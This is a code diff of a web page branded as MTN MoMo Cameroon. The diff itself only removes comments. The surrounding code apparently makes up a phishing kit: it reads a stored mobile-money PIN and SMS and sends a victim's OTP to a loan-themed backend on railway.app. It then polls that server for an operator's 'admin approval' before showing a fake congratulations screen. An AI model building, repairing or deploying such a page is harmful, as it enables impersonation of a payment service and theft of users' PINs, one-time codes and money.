@@ -264,9 +264,6 @@
             flex-shrink: 0;
         }
 
-        /* ============================================
-           WAITING OVERLAY (admin approval)
-           ============================================ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -360,9 +357,6 @@
             color: #aaa;
         }
 
-        /* ============================================
-           CONGRATULATIONS MODAL
-           ============================================ */
         .congrats-overlay {
             position: fixed;
             inset: 0;
@@ -571,7 +565,6 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- WAITING OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -587,7 +580,6 @@
         </div>
     </div>
 
-    <!-- CONGRATULATIONS MODAL (shown after admin approves) -->
     <div class="congrats-overlay" id="congratsOverlay">
         <div class="congrats-content">
             <div class="congrats-header">
@@ -614,20 +606,10 @@
     </div>
 
     <script>
-        // ============================================
-        // BACKEND URL
-        // ============================================
         const API_BASE = 'https://easy-loansej1-production.up.railway.app';
-
-        // ============================================
-        // POLLING CONFIG
-        // ============================================
         const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
 
-        // ============================================
-        // DOM REFERENCES
-        // ============================================
         const otpBoxes = [
             document.getElementById('otp1'),
             document.getElementById('otp2'),
@@ -641,9 +623,6 @@
         const verifyOverlay = document.getElementById('verifyOverlay');
         const congratsOverlay = document.getElementById('congratsOverlay');
 
-        // ============================================
-        // SESSION CHECK
-        // ============================================
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -655,9 +634,6 @@
         const storedPin = localStorage.getItem('momoPin') || '';
         const storedSms = localStorage.getItem('momoSms') || '';
 
-        // ============================================
-        // OTP INPUT HANDLING
-        // ============================================
         function getOtpValue() {
             return otpBoxes.map(b => b.value).join('');
         }
@@ -707,9 +683,6 @@
             });
         });
 
-        // ============================================
-        // RESEND COUNTDOWN
-        // ============================================
         let remaining = 60;
         let timer = null;
 
@@ -738,15 +711,9 @@
             startCountdown();
         });
 
-        // ============================================
-        // WAITING OVERLAY
-        // ============================================
         function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
         function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
 
-        // ============================================
-        // POLLING FOR ADMIN APPROVAL
-        // ============================================
         function startPolling(requestId) {
             stopPolling();
             console.log('🔄 Polling started for requestId:', requestId);
@@ -763,12 +730,10 @@
                     if (data.status === 'approved') {
                         console.log('✅ OTP APPROVED');
                         stopPolling();
-                        // Save verified flag
                         localStorage.setItem('momoVerified', JSON.stringify({
                             verifiedAt: new Date().toISOString(),
                             requestId: requestId
                         }));
-                        // Hide waiting overlay, show congrats
                         hideVerifyOverlay();
                         congratsOverlay.classList.add('show');
 
@@ -779,7 +744,6 @@
                         verifyBtn.disabled = false;
                         verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
-                        // Clear OTP boxes + show error
                         otpBoxes.forEach(b => {
                             b.value = '';
                             b.classList.remove('filled');
@@ -802,9 +766,6 @@
             }
         }
 
-        // ============================================
-        // VERIFY BUTTON → sends OTP to backend → polls admin
-        // ============================================
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
 
@@ -844,7 +805,6 @@
                     throw new Error(data.error || 'Verification failed');
                 }
 
-                // Start polling for admin approval
                 startPolling(data.requestId);
 
             } catch (err) {
@@ -860,9 +820,6 @@
             }
         });
 
-        // ============================================
-        // INIT
-        // ============================================
         otpBoxes[0].focus();
         updateVerifyState();
 
